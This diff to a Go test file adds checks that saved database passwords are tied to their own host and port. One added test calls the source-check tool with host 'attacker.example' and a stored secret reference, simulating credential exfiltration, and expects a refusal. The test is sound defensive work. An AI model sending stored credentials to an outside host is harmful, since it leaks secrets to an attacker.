@@ -245,6 +245,11 @@ func TestTurnSourceConfigDatabase(t *testing.T) {
 		t.Errorf("check without a secret: %s", check)
 	}
 	check = str(admin.checkSource(ctx, sourceCheckIn{OrgID: "org", RunID: in.RunID, Answers: answers("erp-password")}))
+	if strings.Contains(check, plantedSourcePass) || !strings.Contains(check, `The saved password has no host and port.`) {
+		t.Errorf("check with a password that has no host: %s", check)
+	}
+	seed(t, db, `update data_source_secret set host = $1, port = $2::int where name = 'erp-password'`, dbHost, dbPort)
+	check = str(admin.checkSource(ctx, sourceCheckIn{OrgID: "org", RunID: in.RunID, Answers: answers("erp-password")}))
 	if strings.Contains(check, plantedSourcePass) || !strings.Contains(check, `"step":"login","status":"fail"`) {
 		t.Errorf("check with a wrong password: %s", check)
 	}
@@ -266,6 +271,10 @@ func TestTurnSourceConfigDatabase(t *testing.T) {
 	if rpcErr != nil || strings.Contains(out, `\"`+pw+`\"`) || strings.Contains(out, ":"+pw+"@") || !strings.Contains(out, `{\"step\":\"login\",\"status\":\"ok\"`) || !strings.Contains(out, `Tell the admin which step failed`) {
 		t.Fatalf("check tool: %s %v", out, rpcErr)
 	}
+	out, rpcErr = callTool(t, s, "source_config_manager_check_source", map[string]any{"type": "postgres", "host": "attacker.example", "port": answers("").vals["port"], "dbname": "postgres", "user": u.User.Username(), "secretRef": "erp-password"})
+	if rpcErr != nil || !strings.Contains(out, `The saved password belongs to `+dbHost+` on port `+dbPort+`. OpenNeko sends it to no other host or port.`) {
+		t.Fatalf("check tool to another host: %s %v", out, rpcErr)
+	}
 	out, rpcErr = callTool(t, s, "source_config_manager_request_source_config_change", map[string]any{"action": "add_role", "name": "x", "match": "y", "intent": "z"})
 	if rpcErr != nil || !strings.Contains(out, `\"stage\":\"graphjin_config_preview\",\"error\":\"multiple enabled data sources exist`) {
 		t.Fatalf("change tool: %s %v", out, rpcErr)
@@ -282,7 +291,7 @@ func TestTurnSourceConfigDatabase(t *testing.T) {
 		}
 		paths = append(paths, p)
 	}
-	if got := strings.Join(paths, ","); got != "/v1/source-secrets/names,/v1/source-check,/v1/source-config/preview" {
+	if got := strings.Join(paths, ","); got != "/v1/source-secrets/names,/v1/source-check,/v1/source-check,/v1/source-config/preview" {
 		t.Errorf("audit paths: %s", got)
 	}
 
